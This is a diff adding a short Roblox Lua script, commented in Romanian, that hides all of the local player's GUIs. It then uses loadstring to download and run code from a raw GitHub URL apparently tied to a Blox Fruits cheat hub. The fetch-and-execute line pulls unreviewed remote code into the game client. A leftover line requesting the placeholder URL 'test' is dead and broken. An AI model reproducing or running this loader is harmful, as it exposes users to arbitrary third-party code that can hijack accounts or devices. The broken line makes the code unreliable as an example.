@@ -1,0 +1,14 @@
+-- Închide toate GUI-urile din PlayerGui
+local player = game.Players.LocalPlayer
+local guiFolder = player:WaitForChild("PlayerGui")
+
+for _, gui in ipairs(guiFolder:GetChildren()) do
+    if gui:IsA("ScreenGui") or gui:IsA("BillboardGui") or gui:IsA("SurfaceGui") then
+        gui.Enabled = false
+    end
+end
+
+-- Rulează loadstring
+local url = "test" -- pune aici URL-ul tău real
+local code = game:HttpGet(url)
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Zee4625/Blox-Fruits/refs/heads/main/PCHUB10", true))()
